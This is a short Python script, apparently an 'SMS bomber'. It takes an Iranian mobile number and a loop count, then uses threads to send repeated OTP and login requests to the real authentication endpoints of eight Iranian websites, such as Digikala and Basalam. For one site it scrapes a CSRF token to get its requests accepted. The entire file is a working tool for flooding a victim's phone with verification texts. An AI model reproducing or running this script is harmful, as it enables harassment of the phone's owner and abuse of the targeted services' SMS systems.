import requests, time, threading
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

count, lock = 0, threading.Lock()

def send(item):
    global count
    name, url, mode, phone = item
    try:
        if mode == "csrf":
            s = requests.Session()
            token = BeautifulSoup(s.get("https://bornosmode.com/", timeout=5).text, "html.parser").find("meta", {"name": "csrf-token"})["content"]
            r = s.post(url, headers={"X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"}, data={"mobile": phone, "withOtp": "1"})
        elif mode == "gql":
            r = requests.post(url, json={"query": "mutation($mobile:String!){challengeUser(mobile:$mobile){status message}}", "variables": {"mobile": phone}})
        else:
            data = {"username": phone} if mode == "user" else {"mobile": phone}
            r = requests.post(url, json=data, timeout=5)
        
        if r.status_code in [200, 201]:
            with lock: count += 1
            print(f"[✔] {name:<15} -> Sent")
    except: pass

def main():
    # حلقه برای اعتبارسنجی شماره موبایل
    while True:
        phone = input("Phone (09...): ").strip()
        if phone.startswith("09") and len(phone) == 11 and phone.isdigit():
            break
        print("Error: شماره معتبر نیست. لطفاً یک شماره ۱۱ رقمی که با 09 شروع می‌شود وارد کنید.")
    
    loops = int(input("Loops (تعداد دفعات): ") or 1)
    delay = float(input("Delay (تاخیر به ثانیه): ") or 1.0)
    
    services = [
        ("Digikala", "https://api.digikala.com/v1/user/authenticate/", "user", phone),
        ("Bornosmode", "https://bornosmode.com/api/loginRegister/", "csrf", phone),
        ("Vakiljo", "https://vakiljo.ir/api/graphql", "gql", phone),
        ("Basalam", "https://auth.basalam.com/otp-request", "mob", phone),
        ("Bimehland", "https://bimehland.com/MasterApi/VerifyNumber", "mob", phone),
        ("Nobat", "https://nobat.ir/api/v1/auth/otp", "mob", phone),
        ("Bimeparsian", "https://bimeparsian.com/MasterApi/VerifyNumber", "mob", phone),
        ("Ebimename", "https://ebimename.com/MasterApi/VerifyNumber", "mob", phone)
    ]
    
    for i in range(loops):
        print(f"\n--- Loop {i+1}/{loops} ---")
        with ThreadPoolExecutor(15) as ex: ex.map(send, services)
        if i < loops - 1: time.sleep(delay)
    
    print(f"\n[!] Final Success Count: {count}")

if __name__ == "__main__": main()
